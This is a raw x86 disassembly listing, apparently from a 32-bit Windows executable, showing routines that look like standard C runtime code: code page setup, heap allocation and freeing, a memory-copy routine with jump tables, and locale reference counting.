  425de5:	call   0x425a1c
  425dea:	leave  
  425deb:	ret    
  425dec:	push   0x14
  425dee:	push   0x429668
  425df3:	call   0x425350
  425df8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dfc:	push   0xd
  425dfe:	call   0x42550f
  425e03:	pop    ecx
  425e04:	xor    edi,edi
  425e06:	mov    DWORD PTR [ebp-0x4],edi
  425e09:	mov    DWORD PTR ds:0x45dd84,edi
  425e0f:	mov    eax,DWORD PTR [ebp+0x8]
  425e12:	cmp    eax,0xfffffffe
  425e15:	jne    0x425e29
  425e17:	mov    DWORD PTR ds:0x45dd84,0x1
  425e21:	call   DWORD PTR ds:0x4290c4
  425e27:	jmp    0x425e54
  425e29:	cmp    eax,0xfffffffd
  425e2c:	jne    0x425e40
  425e2e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e38:	call   DWORD PTR ds:0x4290c0
  425e3e:	jmp    0x425e54
  425e40:	cmp    eax,0xfffffffc
  425e43:	jne    0x425e54
  425e45:	mov    DWORD PTR ds:0x45dd84,0x1
  425e4f:	mov    eax,ds:0x45ddb4
  425e54:	mov    DWORD PTR [ebp+0x8],eax
  425e57:	cmp    eax,DWORD PTR ds:0x45e024
  425e5d:	je     0x425f1e
  425e63:	mov    esi,DWORD PTR ds:0x45df18
  425e69:	mov    DWORD PTR [ebp-0x20],esi
  425e6c:	cmp    esi,edi
  425e6e:	je     0x425e74
  425e70:	cmp    DWORD PTR [esi],edi
  425e72:	je     0x425e84
  425e74:	push   0x220
  425e79:	call   0x426072
  425e7e:	pop    ecx
  425e7f:	mov    esi,eax
  425e81:	mov    DWORD PTR [ebp-0x20],esi
  425e84:	cmp    esi,edi
  425e86:	je     0x425f07
  425e88:	push   DWORD PTR [ebp+0x8]
  425e8b:	call   0x425c56
  425e90:	pop    ecx
  425e91:	mov    DWORD PTR [ebp-0x1c],eax
  425e94:	cmp    eax,edi
  425e96:	jne    0x425f07
  425e98:	mov    DWORD PTR [esi],edi
  425e9a:	mov    eax,ds:0x45e024
  425e9f:	mov    DWORD PTR [esi+0x4],eax
  425ea2:	mov    eax,ds:0x45df1c
  425ea7:	mov    DWORD PTR [esi+0x8],eax
  425eaa:	mov    eax,ds:0x45df14
  425eaf:	mov    DWORD PTR [esi+0xc],eax
  425eb2:	xor    eax,eax
  425eb4:	mov    DWORD PTR [ebp-0x24],eax
  425eb7:	cmp    eax,0x5
  425eba:	jge    0x425ecc
  425ebc:	mov    cx,WORD PTR [eax*2+0x45e030]
  425ec4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425ec9:	inc    eax
  425eca:	jmp    0x425eb4
  425ecc:	xor    eax,eax
  425ece:	mov    DWORD PTR [ebp-0x24],eax
  425ed1:	cmp    eax,0x101
  425ed6:	jge    0x425ee5
  425ed8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ede:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ee2:	inc    eax
  425ee3:	jmp    0x425ece
  425ee5:	xor    eax,eax
  425ee7:	mov    DWORD PTR [ebp-0x24],eax
  425eea:	cmp    eax,0x100
  425eef:	jge    0x425f01
  425ef1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ef7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425efe:	inc    eax
  425eff:	jmp    0x425ee7
  425f01:	mov    DWORD PTR ds:0x45df18,esi
  425f07:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425f0b:	jne    0x425f21
  425f0d:	cmp    esi,DWORD PTR ds:0x45df18
  425f13:	je     0x425f21
  425f15:	push   esi
  425f16:	call   0x425f5a
  425f1b:	pop    ecx
  425f1c:	jmp    0x425f21
  425f1e:	mov    DWORD PTR [ebp-0x1c],edi
  425f21:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f25:	call   0x425f33
  425f2a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f2d:	call   0x42538b
  425f32:	ret    
  425f33:	push   0xd
  425f35:	call   0x42547b
  425f3a:	pop    ecx
  425f3b:	ret    
  425f3c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f43:	jne    0x425f57
  425f45:	push   0xfffffffd
  425f47:	call   0x425dec
  425f4c:	pop    ecx
  425f4d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f57:	xor    eax,eax
  425f59:	ret    
  425f5a:	push   0xc
  425f5c:	push   0x429678
  425f61:	call   0x425350
  425f66:	mov    esi,DWORD PTR [ebp+0x8]
  425f69:	test   esi,esi
  425f6b:	je     0x425fc5
  425f6d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f74:	jne    0x425fb6
  425f76:	push   0x4
  425f78:	call   0x42550f
  425f7d:	pop    ecx
  425f7e:	and    DWORD PTR [ebp-0x4],0x0
  425f82:	push   esi
  425f83:	call   0x426732
  425f88:	pop    ecx
  425f89:	mov    DWORD PTR [ebp-0x1c],eax
  425f8c:	test   eax,eax
  425f8e:	je     0x425f99
  425f90:	push   esi
  425f91:	push   eax
  425f92:	call   0x42675d
  425f97:	pop    ecx
  425f98:	pop    ecx
  425f99:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f9d:	call   0x425fad
  425fa2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425fa6:	jne    0x425fc5
  425fa8:	push   DWORD PTR [ebp+0x8]
  425fab:	jmp    0x425fb7
  425fad:	push   0x4
  425faf:	call   0x42547b
  425fb4:	pop    ecx
  425fb5:	ret    
  425fb6:	push   esi
  425fb7:	push   0x0
  425fb9:	push   DWORD PTR ds:0x45e140
  425fbf:	call   DWORD PTR ds:0x429048
  425fc5:	call   0x42538b
  425fca:	ret    
  425fcb:	push   0xc
  425fcd:	push   0x429688
  425fd2:	call   0x425350
  425fd7:	mov    esi,DWORD PTR [ebp+0x8]
  425fda:	cmp    DWORD PTR ds:0x45e144,0x3
  425fe1:	jne    0x426011
  425fe3:	cmp    esi,DWORD PTR ds:0x45df04
  425fe9:	ja     0x426011
  425feb:	push   0x4
  425fed:	call   0x42550f
  425ff2:	pop    ecx
  425ff3:	and    DWORD PTR [ebp-0x4],0x0
  425ff7:	push   esi
  425ff8:	call   0x426f11
  425ffd:	pop    ecx
  425ffe:	mov    DWORD PTR [ebp-0x1c],eax
  426001:	or     DWORD PTR [ebp-0x4],0xffffffff
  426005:	call   0x42603d
  42600a:	mov    eax,DWORD PTR [ebp-0x1c]
  42600d:	test   eax,eax
  42600f:	jne    0x426034
  426011:	test   esi,esi
  426013:	jne    0x426016
  426015:	inc    esi
  426016:	cmp    DWORD PTR ds:0x45e144,0x1
  42601d:	je     0x426025
  42601f:	add    esi,0xf
  426022:	and    esi,0xfffffff0
  426025:	push   esi
  426026:	push   0x0
  426028:	push   DWORD PTR ds:0x45e140
  42602e:	call   DWORD PTR ds:0x429030
  426034:	call   0x42538b
  426039:	ret    
  42603a:	mov    esi,DWORD PTR [ebp+0x8]
  42603d:	push   0x4
  42603f:	call   0x42547b
  426044:	pop    ecx
  426045:	ret    
  426046:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42604b:	ja     0x42606f
  42604d:	push   DWORD PTR [esp+0x4]
  426051:	call   0x425fcb
  426056:	test   eax,eax
  426058:	pop    ecx
  426059:	jne    0x426071
  42605b:	cmp    DWORD PTR [esp+0x8],eax
  42605f:	je     0x426071
  426061:	push   DWORD PTR [esp+0x4]
  426065:	call   0x427c32
  42606a:	test   eax,eax
  42606c:	pop    ecx
  42606d:	jne    0x42604d
  42606f:	xor    eax,eax
  426071:	ret    
  426072:	push   DWORD PTR ds:0x45ddc8
  426078:	push   DWORD PTR [esp+0x8]
  42607c:	call   0x426046
  426081:	pop    ecx
  426082:	pop    ecx
  426083:	ret    
  426084:	int3   
  426085:	int3   
  426086:	int3   
  426087:	int3   
  426088:	int3   
  426089:	int3   
  42608a:	int3   
  42608b:	int3   
  42608c:	int3   
  42608d:	int3   
  42608e:	int3   
  42608f:	int3   
  426090:	push   ebp
  426091:	mov    ebp,esp
  426093:	push   edi
  426094:	push   esi
  426095:	mov    esi,DWORD PTR [ebp+0xc]
  426098:	mov    ecx,DWORD PTR [ebp+0x10]
  42609b:	mov    edi,DWORD PTR [ebp+0x8]
  42609e:	mov    eax,ecx
  4260a0:	mov    edx,ecx
  4260a2:	add    eax,esi
  4260a4:	cmp    edi,esi
  4260a6:	jbe    0x4260b0
  4260a8:	cmp    edi,eax
  4260aa:	jb     0x42622c
  4260b0:	test   edi,0x3
  4260b6:	jne    0x4260cc
  4260b8:	shr    ecx,0x2
  4260bb:	and    edx,0x3
  4260be:	cmp    ecx,0x8
  4260c1:	jb     0x4260ec
  4260c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260c5:	jmp    DWORD PTR [edx*4+0x4261dc]
  4260cc:	mov    eax,edi
  4260ce:	mov    edx,0x3
  4260d3:	sub    ecx,0x4
  4260d6:	jb     0x4260e4
  4260d8:	and    eax,0x3
  4260db:	add    ecx,eax
  4260dd:	jmp    DWORD PTR [eax*4+0x4260f0]
  4260e4:	jmp    DWORD PTR [ecx*4+0x4261ec]
  4260eb:	nop
  4260ec:	jmp    DWORD PTR [ecx*4+0x426170]
  4260f3:	nop
  4260f4:	add    BYTE PTR [ecx+0x42],ah
  4260f7:	add    BYTE PTR [ecx+eiz*2],ch
  4260fa:	inc    edx
  4260fb:	add    BYTE PTR [eax+0x61],dl
  4260fe:	inc    edx
  4260ff:	add    BYTE PTR [ebx],ah
  426101:	ror    DWORD PTR [edx-0x75f877fa],1
  426107:	inc    esi
  426108:	add    DWORD PTR [eax+0x468a0147],ecx
  42610e:	add    al,cl
  426110:	jmp    0x289e917
  426115:	add    esi,0x3
  426118:	add    edi,0x3
  42611b:	cmp    ecx,0x8
  42611e:	jb     0x4260ec
  426120:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426122:	jmp    DWORD PTR [edx*4+0x4261dc]
  426129:	lea    ecx,[ecx+0x0]
  42612c:	and    edx,ecx
  42612e:	mov    al,BYTE PTR [esi]
  426130:	mov    BYTE PTR [edi],al
  426132:	mov    al,BYTE PTR [esi+0x1]
  426135:	shr    ecx,0x2
  426138:	mov    BYTE PTR [edi+0x1],al
  42613b:	add    esi,0x2
  42613e:	add    edi,0x2
  426141:	cmp    ecx,0x8
  426144:	jb     0x4260ec
  426146:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426148:	jmp    DWORD PTR [edx*4+0x4261dc]
  42614f:	nop
  426150:	and    edx,ecx
  426152:	mov    al,BYTE PTR [esi]
  426154:	mov    BYTE PTR [edi],al
  426156:	add    esi,0x1
  426159:	shr    ecx,0x2
  42615c:	add    edi,0x1
  42615f:	cmp    ecx,0x8
  426162:	jb     0x4260ec
  426164:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426166:	jmp    DWORD PTR [edx*4+0x4261dc]
  42616d:	lea    ecx,[ecx+0x0]
  426170:	shl    DWORD PTR [ecx+0x42],cl
  426173:	add    al,al
  426175:	popa   
  426176:	inc    edx
  426177:	add    BYTE PTR [eax-0x4fffbd9f],bh
  42617d:	popa   
  42617e:	inc    edx
  42617f:	add    BYTE PTR [eax-0x5fffbd9f],ch
  426185:	popa   
  426186:	inc    edx
  426187:	add    BYTE PTR [eax-0x6fffbd9f],bl
  42618d:	popa   
  42618e:	inc    edx
  42618f:	add    BYTE PTR [ebx-0x761b71bc],cl
  426195:	inc    esp
  426196:	(bad)  
  426197:	in     al,0x8b
  426199:	inc    esp
  42619a:	mov    gs,eax
  42619c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4261a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4261a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4261a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4261ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4261b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4261b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4261b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4261bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4261c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4261c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4261c8:	lea    eax,[ecx*4+0x0]
  4261cf:	add    esi,eax
  4261d1:	add    edi,eax
  4261d3:	jmp    DWORD PTR [edx*4+0x4261dc]
  4261da:	mov    edi,edi
  4261dc:	in     al,dx
  4261dd:	popa   
  4261de:	inc    edx
  4261df:	add    ah,dh
  4261e1:	popa   
  4261e2:	inc    edx
  4261e3:	add    BYTE PTR [eax],al
  4261e5:	bound  eax,QWORD PTR [edx+0x0]
  4261e8:	adc    al,0x62
  4261ea:	inc    edx
  4261eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4261f1:	leave  
  4261f2:	ret    
  4261f3:	nop
  4261f4:	mov    al,BYTE PTR [esi]
  4261f6:	mov    BYTE PTR [edi],al
  4261f8:	mov    eax,DWORD PTR [ebp+0x8]
  4261fb:	pop    esi
  4261fc:	pop    edi
  4261fd:	leave  
  4261fe:	ret    
  4261ff:	nop
  426200:	mov    al,BYTE PTR [esi]
  426202:	mov    BYTE PTR [edi],al
  426204:	mov    al,BYTE PTR [esi+0x1]
  426207:	mov    BYTE PTR [edi+0x1],al
  42620a:	mov    eax,DWORD PTR [ebp+0x8]
  42620d:	pop    esi
  42620e:	pop    edi
  42620f:	leave  
  426210:	ret    
  426211:	lea    ecx,[ecx+0x0]
  426214:	mov    al,BYTE PTR [esi]
  426216:	mov    BYTE PTR [edi],al
  426218:	mov    al,BYTE PTR [esi+0x1]
  42621b:	mov    BYTE PTR [edi+0x1],al
  42621e:	mov    al,BYTE PTR [esi+0x2]
  426221:	mov    BYTE PTR [edi+0x2],al
  426224:	mov    eax,DWORD PTR [ebp+0x8]
  426227:	pop    esi
  426228:	pop    edi
  426229:	leave  
  42622a:	ret    
  42622b:	nop
  42622c:	lea    esi,[ecx+esi*1-0x4]
  426230:	lea    edi,[ecx+edi*1-0x4]
  426234:	test   edi,0x3
  42623a:	jne    0x426260
  42623c:	shr    ecx,0x2
  42623f:	and    edx,0x3
  426242:	cmp    ecx,0x8
  426245:	jb     0x426254
  426247:	std    
  426248:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42624a:	cld    
  42624b:	jmp    DWORD PTR [edx*4+0x426378]
  426252:	mov    edi,edi
  426254:	neg    ecx
  426256:	jmp    DWORD PTR [ecx*4+0x426328]
  42625d:	lea    ecx,[ecx+0x0]
  426260:	mov    eax,edi
  426262:	mov    edx,0x3
  426267:	cmp    ecx,0x4
  42626a:	jb     0x426278
  42626c:	and    eax,0x3
  42626f:	sub    ecx,eax
  426271:	jmp    DWORD PTR [eax*4+0x42627c]
  426278:	jmp    DWORD PTR [ecx*4+0x426378]
  42627f:	nop
  426280:	mov    WORD PTR [edx+0x42],fs
  426283:	add    BYTE PTR [eax-0x27ffbd9e],dh
  426289:	bound  eax,QWORD PTR [edx+0x0]
  42628c:	mov    al,BYTE PTR [esi+0x3]
  42628f:	and    edx,ecx
  426291:	mov    BYTE PTR [edi+0x3],al
  426294:	sub    esi,0x1
  426297:	shr    ecx,0x2
  42629a:	sub    edi,0x1
  42629d:	cmp    ecx,0x8
  4262a0:	jb     0x426254
  4262a2:	std    
  4262a3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262a5:	cld    
  4262a6:	jmp    DWORD PTR [edx*4+0x426378]
  4262ad:	lea    ecx,[ecx+0x0]
  4262b0:	mov    al,BYTE PTR [esi+0x3]
  4262b3:	and    edx,ecx
  4262b5:	mov    BYTE PTR [edi+0x3],al
  4262b8:	mov    al,BYTE PTR [esi+0x2]
  4262bb:	shr    ecx,0x2
  4262be:	mov    BYTE PTR [edi+0x2],al
  4262c1:	sub    esi,0x2
  4262c4:	sub    edi,0x2
  4262c7:	cmp    ecx,0x8
  4262ca:	jb     0x426254
  4262cc:	std    
  4262cd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262cf:	cld    
  4262d0:	jmp    DWORD PTR [edx*4+0x426378]
  4262d7:	nop
  4262d8:	mov    al,BYTE PTR [esi+0x3]
  4262db:	and    edx,ecx
  4262dd:	mov    BYTE PTR [edi+0x3],al
  4262e0:	mov    al,BYTE PTR [esi+0x2]
  4262e3:	mov    BYTE PTR [edi+0x2],al
  4262e6:	mov    al,BYTE PTR [esi+0x1]
  4262e9:	shr    ecx,0x2
  4262ec:	mov    BYTE PTR [edi+0x1],al
  4262ef:	sub    esi,0x3
  4262f2:	sub    edi,0x3
  4262f5:	cmp    ecx,0x8
  4262f8:	jb     0x426254
  4262fe:	std    
  4262ff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426301:	cld    
  426302:	jmp    DWORD PTR [edx*4+0x426378]
  426309:	lea    ecx,[ecx+0x0]
  42630c:	sub    al,0x63
  42630e:	inc    edx
  42630f:	add    BYTE PTR [ebx+eiz*2],dh
  426312:	inc    edx
  426313:	add    BYTE PTR [ebx+eiz*2],bh
  426316:	inc    edx
  426317:	add    BYTE PTR [ebx+eiz*2+0x42],al
  42631b:	add    BYTE PTR [ebx+eiz*2+0x42],cl
  42631f:	add    BYTE PTR [ebx+eiz*2+0x42],dl
  426323:	add    BYTE PTR [ebx+eiz*2+0x42],bl
  426327:	add    BYTE PTR [edi+0x63],ch
  42632a:	inc    edx
  42632b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426331:	inc    esp
  426332:	(bad)  
  426333:	sbb    al,0x8b
  426335:	inc    esp
  426336:	mov    ds,WORD PTR [eax]
  426338:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42633c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426340:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426344:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426348:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42634c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426350:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426354:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426358:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42635c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426360:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426364:	lea    eax,[ecx*4+0x0]
  42636b:	add    esi,eax
  42636d:	add    edi,eax
  42636f:	jmp    DWORD PTR [edx*4+0x426378]
  426376:	mov    edi,edi
  426378:	mov    BYTE PTR [ebx+0x42],ah
  42637b:	add    BYTE PTR [eax-0x5fffbd9d],dl
  426381:	arpl   WORD PTR [edx+0x0],ax
  426384:	mov    ah,0x63
  426386:	inc    edx
  426387:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42638d:	leave  
  42638e:	ret    
  42638f:	nop
  426390:	mov    al,BYTE PTR [esi+0x3]
  426393:	mov    BYTE PTR [edi+0x3],al
  426396:	mov    eax,DWORD PTR [ebp+0x8]
  426399:	pop    esi
  42639a:	pop    edi
  42639b:	leave  
  42639c:	ret    
  42639d:	lea    ecx,[ecx+0x0]
  4263a0:	mov    al,BYTE PTR [esi+0x3]
  4263a3:	mov    BYTE PTR [edi+0x3],al
  4263a6:	mov    al,BYTE PTR [esi+0x2]
  4263a9:	mov    BYTE PTR [edi+0x2],al
  4263ac:	mov    eax,DWORD PTR [ebp+0x8]
  4263af:	pop    esi
  4263b0:	pop    edi
  4263b1:	leave  
  4263b2:	ret    
  4263b3:	nop
  4263b4:	mov    al,BYTE PTR [esi+0x3]
  4263b7:	mov    BYTE PTR [edi+0x3],al
  4263ba:	mov    al,BYTE PTR [esi+0x2]
  4263bd:	mov    BYTE PTR [edi+0x2],al
  4263c0:	mov    al,BYTE PTR [esi+0x1]
  4263c3:	mov    BYTE PTR [edi+0x1],al
  4263c6:	mov    eax,DWORD PTR [ebp+0x8]
  4263c9:	pop    esi
  4263ca:	pop    edi
  4263cb:	leave  
  4263cc:	ret    
  4263cd:	push   DWORD PTR [esp+0x4]
  4263d1:	call   DWORD PTR ds:0x4290cc
  4263d7:	xor    eax,eax
  4263d9:	inc    eax
  4263da:	ret    0x8
  4263dd:	push   0x10
  4263df:	push   0x4296d0
  4263e4:	call   0x425350
  4263e9:	mov    eax,ds:0x45dd88
  4263ee:	test   eax,eax
  4263f0:	jne    0x426429
  4263f2:	cmp    DWORD PTR ds:0x45dac4,0x1
  4263f9:	je     0x42641f
  4263fb:	push   0x4296bc
  426400:	call   DWORD PTR ds:0x429024
  426406:	test   eax,eax
  426408:	je     0x42641f
  42640a:	push   0x429694
  42640f:	push   eax
  426410:	call   DWORD PTR ds:0x429020
  426416:	mov    ds:0x45dd88,eax
  42641b:	test   eax,eax
  42641d:	jne    0x426429
  42641f:	mov    eax,0x4263cd
  426424:	mov    ds:0x45dd88,eax
  426429:	and    DWORD PTR [ebp-0x4],0x0
  42642d:	push   DWORD PTR [ebp+0xc]
  426430:	push   DWORD PTR [ebp+0x8]
  426433:	call   eax
  426435:	mov    DWORD PTR [ebp-0x1c],eax
  426438:	jmp    0x42645e
  42643a:	mov    eax,DWORD PTR [ebp-0x14]
  42643d:	mov    eax,DWORD PTR [eax]
  42643f:	mov    eax,DWORD PTR [eax]
  426441:	mov    DWORD PTR [ebp-0x20],eax
  426444:	xor    eax,eax
  426446:	inc    eax
  426447:	ret    
  426448:	mov    esp,DWORD PTR [ebp-0x18]
  42644b:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  426452:	jne    0x42645c
  426454:	push   0x8
  426456:	call   DWORD PTR ds:0x429098
  42645c:	xor    eax,eax
  42645e:	or     DWORD PTR [ebp-0x4],0xffffffff
  426462:	call   0x42538b
  426467:	ret    
  426468:	push   0x10
  42646a:	push   0x4296e0
  42646f:	call   0x425350
  426474:	mov    esi,DWORD PTR [ebp+0x8]
  426477:	imul   esi,DWORD PTR [ebp+0xc]
  42647b:	mov    DWORD PTR [ebp-0x1c],esi
  42647e:	test   esi,esi
  426480:	jne    0x426483
  426482:	inc    esi
  426483:	xor    edi,edi
  426485:	mov    DWORD PTR [ebp-0x20],edi
  426488:	cmp    esi,0xffffffe0
  42648b:	ja     0x4264f2
  42648d:	cmp    DWORD PTR ds:0x45e144,0x3
  426494:	jne    0x4264dd
  426496:	add    esi,0xf
  426499:	and    esi,0xfffffff0
  42649c:	mov    DWORD PTR [ebp+0xc],esi
  42649f:	mov    ebx,DWORD PTR [ebp-0x1c]
  4264a2:	cmp    ebx,DWORD PTR ds:0x45df04
  4264a8:	ja     0x4264dd
  4264aa:	push   0x4
  4264ac:	call   0x42550f
  4264b1:	pop    ecx
  4264b2:	and    DWORD PTR [ebp-0x4],edi
  4264b5:	push   ebx
  4264b6:	call   0x426f11
  4264bb:	pop    ecx
  4264bc:	mov    DWORD PTR [ebp-0x20],eax
  4264bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4264c3:	call   0x426512
  4264c8:	mov    edi,DWORD PTR [ebp-0x20]
  4264cb:	test   edi,edi
  4264cd:	je     0x4264e1
  4264cf:	push   DWORD PTR [ebp-0x1c]
  4264d2:	push   0x0
  4264d4:	push   edi
  4264d5:	call   0x427c50
  4264da:	add    esp,0xc
  4264dd:	test   edi,edi
  4264df:	jne    0x42651b
  4264e1:	push   esi
  4264e2:	push   0x8
  4264e4:	push   DWORD PTR ds:0x45e140
  4264ea:	call   DWORD PTR ds:0x429030
  4264f0:	mov    edi,eax
  4264f2:	test   edi,edi
  4264f4:	jne    0x42651b
  4264f6:	cmp    DWORD PTR ds:0x45ddc8,edi
  4264fc:	je     0x42651b
  4264fe:	push   esi
  4264ff:	call   0x427c32
  426504:	pop    ecx
  426505:	test   eax,eax
  426507:	jne    0x426483
  42650d:	jmp    0x42651d
  42650f:	mov    esi,DWORD PTR [ebp+0xc]
  426512:	push   0x4
  426514:	call   0x42547b
  426519:	pop    ecx
  42651a:	ret    
  42651b:	mov    eax,edi
  42651d:	call   0x42538b
  426522:	ret    
  426523:	push   esi
  426524:	mov    esi,DWORD PTR [esp+0x8]
  426528:	mov    eax,DWORD PTR [esi+0x3c]
  42652b:	push   edi
  42652c:	xor    edi,edi
  42652e:	cmp    eax,DWORD PTR ds:0x45ddd4
  426534:	je     0x426599
  426536:	cmp    eax,edi
  426538:	je     0x426599
  42653a:	mov    eax,DWORD PTR [esi+0x2c]
  42653d:	cmp    DWORD PTR [eax],edi
  42653f:	jne    0x426599
  426541:	mov    eax,DWORD PTR [esi+0x34]
  426544:	cmp    eax,edi
  426546:	je     0x426564
  426548:	cmp    DWORD PTR [eax],edi
  42654a:	jne    0x426564
  42654c:	cmp    eax,DWORD PTR ds:0x45def0
  426552:	je     0x426564
  426554:	push   eax
  426555:	call   0x425f5a
  42655a:	push   DWORD PTR [esi+0x3c]
  42655d:	call   0x427e9f
  426562:	pop    ecx
  426563:	pop    ecx
  426564:	mov    eax,DWORD PTR [esi+0x30]
  426567:	cmp    eax,edi
  426569:	je     0x426587
  42656b:	cmp    DWORD PTR [eax],edi
  42656d:	jne    0x426587
  42656f:	cmp    eax,DWORD PTR ds:0x45def4
  426575:	je     0x426587
  426577:	push   eax
  426578:	call   0x425f5a
  42657d:	push   DWORD PTR [esi+0x3c]
  426580:	call   0x427e40
  426585:	pop    ecx
  426586:	pop    ecx
  426587:	push   DWORD PTR [esi+0x2c]
  42658a:	call   0x425f5a
  42658f:	push   DWORD PTR [esi+0x3c]
  426592:	call   0x425f5a
  426597:	pop    ecx
  426598:	pop    ecx
  426599:	mov    eax,DWORD PTR [esi+0x40]
  42659c:	cmp    eax,DWORD PTR ds:0x45deec
  4265a2:	je     0x4265bc
  4265a4:	cmp    eax,edi
  4265a6:	je     0x4265bc
  4265a8:	cmp    DWORD PTR [eax],edi
  4265aa:	jne    0x4265bc
  4265ac:	push   eax
  4265ad:	call   0x425f5a
  4265b2:	push   DWORD PTR [esi+0x44]
  4265b5:	call   0x425f5a
  4265ba:	pop    ecx
  4265bb:	pop    ecx
  4265bc:	mov    eax,DWORD PTR [esi+0x50]
  4265bf:	cmp    eax,DWORD PTR ds:0x45ddd0
  4265c5:	je     0x4265e3
  4265c7:	cmp    eax,edi
  4265c9:	je     0x4265e3
  4265cb:	cmp    DWORD PTR [eax+0xb4],edi
  4265d1:	jne    0x4265e3
  4265d3:	push   eax
  4265d4:	call   0x427cb0
  4265d9:	push   DWORD PTR [esi+0x50]
  4265dc:	call   0x425f5a
  4265e1:	pop    ecx
  4265e2:	pop    ecx
  4265e3:	push   esi
  4265e4:	call   0x425f5a
  4265e9:	pop    ecx
  4265ea:	pop    edi
  4265eb:	pop    esi
  4265ec:	ret    
  4265ed:	push   esi
  4265ee:	call   0x425203
  4265f3:	mov    esi,eax
  4265f5:	mov    eax,DWORD PTR [esi+0x64]
  4265f8:	cmp    eax,DWORD PTR ds:0x45d58c
  4265fe:	je     0x4266aa
  426604:	test   eax,eax
  426606:	je     0x426637
  426608:	mov    ecx,DWORD PTR [eax+0x2c]
  42660b:	dec    DWORD PTR [eax]
  42660d:	test   ecx,ecx
  42660f:	je     0x426613
  426611:	dec    DWORD PTR [ecx]
  426613:	mov    ecx,DWORD PTR [eax+0x34]
  426616:	test   ecx,ecx
  426618:	je     0x42661c
  42661a:	dec    DWORD PTR [ecx]
  42661c:	mov    ecx,DWORD PTR [eax+0x30]
  42661f:	test   ecx,ecx
  426621:	je     0x426625
  426623:	dec    DWORD PTR [ecx]
  426625:	mov    ecx,DWORD PTR [eax+0x40]
  426628:	test   ecx,ecx
  42662a:	je     0x42662e
  42662c:	dec    DWORD PTR [ecx]
  42662e:	mov    ecx,DWORD PTR [eax+0x4c]
  426631:	dec    DWORD PTR [ecx+0xb4]
  426637:	mov    ecx,DWORD PTR ds:0x45d58c
  42663d:	mov    DWORD PTR [esi+0x64],ecx
  426640:	mov    ecx,DWORD PTR ds:0x45d58c
  426646:	inc    DWORD PTR [ecx]
  426648:	mov    ecx,DWORD PTR ds:0x45d58c
  42664e:	mov    ecx,DWORD PTR [ecx+0x2c]
  426651:	test   ecx,ecx
  426653:	je     0x426657
  426655:	inc    DWORD PTR [ecx]
  426657:	mov    ecx,DWORD PTR ds:0x45d58c
  42665d:	mov    ecx,DWORD PTR [ecx+0x34]
  426660:	test   ecx,ecx
  426662:	je     0x426666
  426664:	inc    DWORD PTR [ecx]
  426666:	mov    ecx,DWORD PTR ds:0x45d58c
  42666c:	mov    ecx,DWORD PTR [ecx+0x30]
  42666f:	test   ecx,ecx
  426671:	je     0x426675
  426673:	inc    DWORD PTR [ecx]
  426675:	mov    ecx,DWORD PTR ds:0x45d58c
  42667b:	mov    ecx,DWORD PTR [ecx+0x40]
  42667e:	test   ecx,ecx
  426680:	je     0x426684
  426682:	inc    DWORD PTR [ecx]
  426684:	mov    ecx,DWORD PTR ds:0x45d58c
  42668a:	mov    ecx,DWORD PTR [ecx+0x4c]
  42668d:	inc    DWORD PTR [ecx+0xb4]
  426693:	test   eax,eax
  426695:	je     0x4266aa
  426697:	cmp    DWORD PTR [eax],0x0
  42669a:	jne    0x4266aa
  42669c:	cmp    eax,0x45d538
  4266a1:	je     0x4266aa
  4266a3:	push   eax
  4266a4:	call   0x426523
  4266a9:	pop    ecx
  4266aa:	mov    eax,DWORD PTR [esi+0x64]
  4266ad:	pop    esi
  4266ae:	ret    
  4266af:	push   0xc
  4266b1:	push   0x429870
  4266b6:	call   0x425350
  4266bb:	push   0xc
  4266bd:	call   0x42550f
  4266c2:	pop    ecx
  4266c3:	and    DWORD PTR [ebp-0x4],0x0
  4266c7:	call   0x4265ed
